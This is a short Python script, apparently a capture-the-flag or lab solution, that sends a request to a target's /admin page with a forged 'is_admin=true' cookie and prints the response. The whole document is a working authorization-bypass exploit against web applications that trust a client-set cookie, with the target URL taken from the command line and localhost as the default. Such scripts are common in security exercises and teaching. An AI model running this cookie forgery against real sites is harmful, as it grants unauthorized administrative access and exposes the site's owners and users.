import requests
import sys

s = requests.Session()
url = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:1337'

# send a request to the admin page with the is_admin cookie set to true
r = s.get(url + "/admin", cookies={"is_admin": "true"})
print(r.text)
